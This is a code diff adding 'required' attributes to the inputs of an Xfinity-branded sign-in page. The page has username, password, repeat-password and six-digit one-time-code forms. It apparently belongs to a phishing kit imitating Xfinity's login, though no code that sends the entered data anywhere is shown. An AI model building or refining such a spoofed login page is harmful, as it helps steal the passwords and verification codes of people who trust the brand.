@@ -288,7 +288,7 @@
   <h1 class="screen2-title">Sign in with your Xfinity ID</h1>
 
   <form id="usernameForm">
-    <input type="text" id="pfnid" class="input-plain" placeholder="Email, mobile, or username">
+    <input type="text" id="pfnid" class="input-plain" placeholder="Email, mobile, or username" required>
     <div class="error-msg" id="id-error">Please enter your email, mobile, or username.</div>
 
     <div class="checkbox-row">
@@ -321,7 +321,7 @@
 
   <form id="passwordForm">
     <div class="input-wrap">
-      <input type="password" id="password" autocomplete="current-password">
+      <input type="password" id="password" autocomplete="current-password" required>
       <span class="eye-icon" id="eye-toggle" onclick="togglePass()">
         <!-- Eye OPEN icon (shown when password is hidden) -->
         <svg id="eye-open" viewBox="0 0 24 24">
@@ -369,7 +369,7 @@
   <h1>Enter your password</h1>
 
   <div class="input-wrap">
-    <input type="password" id="password-retry" autocomplete="current-password">
+    <input type="password" id="password-retry" autocomplete="current-password" required>
     <span class="eye-icon" id="eye-toggle-retry" onclick="togglePassRetry()">
       <!-- Eye OPEN icon (shown when password is hidden) -->
       <svg id="eye-open-retry" viewBox="0 0 24 24">
@@ -421,12 +421,12 @@
 
   <form id="otpForm">
     <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
-      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
-      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
-      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
-      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
-      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
-      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
+      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;" required>
+      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;" required>
+      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;" required>
+      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;" required>
+      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;" required>
+      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;" required>
     </div>
 
     <button type="submit" class="btn-primary">Verify</button>
